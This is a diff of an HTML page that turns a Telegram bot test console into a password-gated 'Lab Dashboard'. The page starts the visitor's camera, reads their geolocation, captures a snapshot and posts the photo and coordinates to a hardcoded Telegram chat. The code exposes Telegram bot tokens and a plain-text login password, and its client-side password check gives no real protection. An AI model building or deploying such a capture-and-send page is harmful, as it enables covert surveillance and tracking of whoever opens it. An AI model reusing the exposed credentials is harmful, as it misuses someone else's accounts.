@@ -2,41 +2,71 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <title>Gateway v2</title>
+    <title>Control Panel</title>
+    <style>
+        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
+        .btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 8px; cursor: pointer; color: white; font-weight: bold; background: #3b82f6; }
+        #dashboard { display: none; }
+        #v { width: 100%; display: none; margin-top: 10px; }
+    </style>
 </head>
 <body>
-    <h2>Test Console</h2>
-    <button onclick="testConnection()">Send Test Message</button>
-    <div id="status"></div>
+
+<div class="card" id="loginSection">
+    <h2>Login</h2>
+    <input type="password" id="passwordInput" placeholder="Password...">
+    <button class="btn" onclick="verifyPassword()" style="background:#22c55e;">Login</button>
+</div>
+
+<div class="card" id="dashboard">
+    <h2>Lab Dashboard</h2>
+    <button class="btn" onclick="initiateHardware()">Camera & Location</button>
+    <button class="btn" onclick="captureSnapshot()">Capture Photo</button>
+    
+    <video id="v" autoplay playsinline></video>
+    <div id="status" style="margin-top:10px; font-size:12px; color:gray;">System Ready</div>
+</div>
 
 <script>
-    const BOT_TOKEN = "8566985497:AAEOAjObJ9nz67yeEdM1vOEncMyJnxerqJc";
-    const CHAT_ID = "8566985497";
+    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
+    const CHAT_ID = "8566985497"; 
+    let lat = "N/A", lon = "N/A";
 
-    async function testConnection() {
-        document.getElementById('status').innerText = "Sending...";
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const data = {
-            chat_id: CHAT_ID,
-            text: "সংযোগ পরীক্ষা সফল হয়েছে! বট সচল আছে।"
-        };
+    function verifyPassword() {
+        if(document.getElementById('passwordInput').value === "Tamim0186#@") {
+            document.getElementById('loginSection').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+        } else { alert("Wrong Password!"); }
+    }
 
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
-            const result = await response.json();
-            if(result.ok) {
-                document.getElementById('status').innerText = "✅ মেসেজ সফলভাবে গেছে!";
-            } else {
-                document.getElementById('status').innerText = "❌ এরর: " + result.description;
-            }
-        } catch (e) {
-            document.getElementById('status').innerText = "❌ কানেকশন এরর!";
-        }
+    async function initiateHardware() {
+        navigator.geolocation.getCurrentPosition(pos => {
+            lat = pos.coords.latitude;
+            lon = pos.coords.longitude;
+        });
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        document.getElementById('v').srcObject = stream;
+        document.getElementById('v').style.display = 'block';
+    }
+
+    function captureSnapshot() {
+        const v = document.getElementById('v');
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob);
+            formData.append('caption', `Loc: ${lat}, ${lon}`);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST', body: formData
+            }).then(() => document.getElementById('status').innerText = "✅ Sent!");
+        });
     }
 </script>
+
 </body>
 </html>
